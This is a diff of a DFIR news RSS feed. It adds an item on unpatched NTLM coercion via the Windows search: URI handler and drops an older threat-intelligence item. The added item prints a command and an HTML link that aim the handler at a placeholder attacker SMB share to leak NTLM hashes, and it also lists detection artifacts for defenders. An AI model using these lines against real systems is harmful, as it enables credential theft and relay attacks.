@@ -5,8 +5,40 @@
     <link>https://x.com/DFIR_Radar</link>
     <description>Keeping DFIR Intelligence on your Radar. The best DFIR research from hundreds of sources, filtered for relevance.</description>
     <language>en</language>
-    <lastBuildDate>Tue, 02 Jun 2026 16:03:43 +0000</lastBuildDate>
+    <lastBuildDate>Tue, 02 Jun 2026 17:03:37 +0000</lastBuildDate>
     <atom:link href="https://falhumaid.github.io/DFIR_Radar_RSS/rss.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>Unpatched NTLM Coercion in Windows search: URI Handler, Same Bug, No CVE, No Fix</title>
+      <link>https://www.huntress.com/blog/unpatched-ntlm-coercion-windows-search-uri-handler</link>
+      <description>Microsoft 🇺🇸 patches NTLM coercion in Snipping Tool but leaves identical bug unfixed in Windows search handler. Same technique, same impact, different policy outcome exposes inconsistent vulnerability management.
+
+Key technical details:
+• search: URI handler accepts crumb=location: parameter pointing to UNC paths without validation
+• Triggers automatic NTLM authentication, leaking Net-NTLMv2 hashes to attacker-controlled SMB shares
+• Works via command line: start "" "search:query=test&amp;crumb=location:\\attacker[.]ip\share"
+• Also exploitable through web links: &lt;a href="search:query=test&amp;crumb=location:\\attacker[.]ip\share"&gt;
+• Both search: and search-ms: handlers use same COM class (CLSID {90b9bce2-b6db-4fd3-8451-35917ea1081b}) in ExplorerFrame.dll
+
+Attack methodology:
+• Single click triggers immediate hash leak before error dialog appears
+• First invocation per user session captures credentials; subsequent attempts fail until re-login
+• No malware required - abuses built-in Windows authentication behavior
+• Captured hashes useful for relay attacks or offline cracking depending on environment
+
+DFIR artifacts and detection:
+• Monitor for search: and search-ms: URIs in email/proxy logs - neither belongs in legitimate traffic
+• Process creation events showing Explorer.exe spawning with search: parameters
+• SMB connection attempts to external IPs from workstations
+• Authentication logs showing NTLM challenges to unusual destinations
+
+Impact and scope:
+
+#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2061856271448559657</description>
+      <category>VULNERABILITY</category>
+      <source url="https://x.com/DFIR_Radar/status/2061856271448559657">DFIR Radar</source>
+      <pubDate>Tue, 02 Jun 2026 17:03:37 +0000</pubDate>
+      <guid isPermaLink="false">2061856271448559657</guid>
+    </item>
     <item>
       <title>The HazyBeacon Protocol – How Malware Weaponizes Amazon Web Services (AWS) Lambda Function URLs</title>
       <link>https://blog.qualys.com/category/qualys-insights</link>
@@ -1849,17 +1881,6 @@ Hunt for unauthorized Deno/Bun installations, monitor Edge processes with CDP co
       <source url="https://x.com/DFIR_Radar/status/2059274235147960649">DFIR Radar</source>
       <pubDate>Tue, 26 May 2026 14:03:32 +0000</pubDate>
       <guid isPermaLink="false">2059274235147960649</guid>
-    </item>
-    <item>
-      <title>IRGC-linked Nimbus Manticore group attacks defense, aerospace, telecom sectors using Minifast malware toolkit</title>
-      <link>https://industrialcyber.co/ransomware/irgc-linked-nimbus-manticore-group-attacks-defense-aerospace-telecom-sectors-using-minifast-malware-toolkit/</link>
-      <description>Iranian 🇮🇷 IRGC-linked Nimbus Manticore deploys new MiniFast backdoor via AppDomain hijacking and trojanized Zoom installers, targeting US 🇺🇸/EU defense and aerospace sectors. Campaign shows AI-assisted malware development patterns.
-
-#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2059259158067544064</description>
-      <category>THREAT INTELLIGENCE</category>
-      <source url="https://x.com/DFIR_Radar/status/2059259158067544064">DFIR Radar</source>
-      <pubDate>Tue, 26 May 2026 13:03:37 +0000</pubDate>
-      <guid isPermaLink="false">2059259158067544064</guid>
     </item>
   </channel>
 </rss>
